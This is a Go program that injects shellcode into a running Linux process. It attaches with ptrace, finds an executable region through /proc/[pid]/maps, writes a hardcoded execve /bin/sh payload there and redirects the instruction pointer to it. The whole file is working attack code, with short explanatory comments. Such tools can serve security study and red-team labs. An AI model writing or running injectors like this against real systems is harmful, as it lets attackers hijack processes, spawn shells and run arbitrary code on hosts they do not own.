package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
)

var shellcode = []byte{
	0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91,
	0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53,
	0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
	0x3b, 0x0f, 0x05,
}
// binsh shellcode
func inject(pid int) {
	var regs syscall.PtraceRegs

	// Attach to the target process using ptrace syscall. Ptrace attaches to the process specified in pid making it a tracee of the calling process. The tracee is sent a sigstop. 
	if err := syscall.PtraceAttach(pid); err != nil {
		fmt.Printf("Failed to attach to process: %v\n", err)
		os.Exit(1)
	}
	defer syscall.PtraceDetach(pid)

	// Wait for the process to stop so we can manipulate it
	if _, err := syscall.Wait4(pid, nil, 0, nil); err != nil {
		fmt.Printf("Failed to wait for process: %v\n", err)
		os.Exit(1)
	}

	// Get the current register state. Copy the tracees general purpose registers 
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		fmt.Printf("Failed to get register state: %v\n", err)
		os.Exit(1)
	}

	// Go through /proc/[pid]/maps to find an executable memory region
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	file, err := os.Open(mapsPath)
	if err != nil {
		fmt.Printf("Failed to open maps file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()
	// saving the address of the rxp memory region
	var address uintptr
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "r-xp") {
			parts := strings.Split(line, " ")
			addrRange := strings.Split(parts[0], "-")
			if len(addrRange) != 2 {
				continue
			}

			addr, err := strconv.ParseUint(addrRange[0], 16, 64)
			if err == nil {
				address = uintptr(addr)
				break
			}
		}
	}

	if address == 0 {
		fmt.Println("Failed to find a suitable memory region for injection.")
		os.Exit(1)
	}

	// Write the shellcode to the target process's memory
	for i := 0; i < len(shellcode); i += 8 {
		chunk := shellcode[i:]
		if len(chunk) > 8 {
			chunk = chunk[:8]
		}
		if _, err := syscall.PtracePokeData(pid, address+uintptr(i), chunk); err != nil {
			fmt.Printf("Failed to write data to process memory: %v\n", err)
			os.Exit(1)
		}
	}

	// Modify rip to jump to the injected code
	regs.Rip = uint64(address)
	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		fmt.Printf("Failed to set register state: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[*] Successfully injected shellcode!")
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run inject.go <pid>")
		os.Exit(1)
	}

	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Printf("Invalid PID: %v\n", err)
		os.Exit(1)
	}

	inject(pid)
}
